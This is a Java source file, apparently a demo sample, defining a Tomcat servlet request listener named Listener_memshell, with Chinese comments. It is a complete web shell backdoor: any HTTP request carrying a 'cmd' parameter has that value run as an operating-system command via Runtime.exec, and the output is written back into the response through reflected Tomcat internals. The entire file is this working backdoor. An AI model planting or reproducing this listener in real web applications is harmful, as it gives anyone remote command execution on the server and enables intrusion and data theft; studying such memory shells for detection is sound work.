// src/main/java/Listener_memshell.java
package example.demo;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;

@WebListener
public class Listener_memshell implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre){
        // 获取request请求
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        // 获取参数
        String cmd = req.getParameter("cmd");
        if(cmd != null){
            try{
                // 获得response响应
                Field requestF = req.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                Request request = (Request) requestF.get(req);
                Response response = (Response) request.getResponse();

                // 执行命令
                InputStream ins = Runtime.getRuntime().exec(cmd).getInputStream();
                BufferedInputStream bins = new BufferedInputStream(ins);
                response.setContentType("text/html;charset=UTF-8");
                response.getWriter().write("Listener_memshell 被执行\n");
                int len;
                while ((len = bins.read()) != -1) {
                    response.getWriter().write(len);
                }
            } catch (IOException e){
                e.printStackTrace();
            } catch (NullPointerException n){
                n.printStackTrace();
            } catch (NoSuchFieldException e) {
            } catch (IllegalAccessException e) {
            }
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre){

    }
}
